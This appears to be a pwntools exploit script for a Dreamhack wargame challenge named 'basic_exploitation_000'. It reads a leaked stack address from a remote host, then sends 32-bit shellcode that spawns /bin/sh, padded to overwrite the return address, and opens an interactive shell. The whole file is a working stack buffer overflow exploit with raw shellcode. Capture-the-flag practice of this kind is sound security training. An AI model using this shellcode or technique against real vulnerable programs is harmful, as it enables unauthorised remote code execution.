from pwn import *

exe = ELF('basic_exploitation_000')
#r = process(exe.path)
r = remote('host2.dreamhack.games', 22570)

r.recvuntil(b'(')
leak_buf = r.recv(10).decode()
log.info("leak stack: " + leak_buf)
leak_buf = int(leak_buf, 16)

payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload = payload.ljust(0x80 + 0x4, b'a')
payload += p32(leak_buf)
#input()
r.sendlineafter(b')\n', payload)
r.interactive()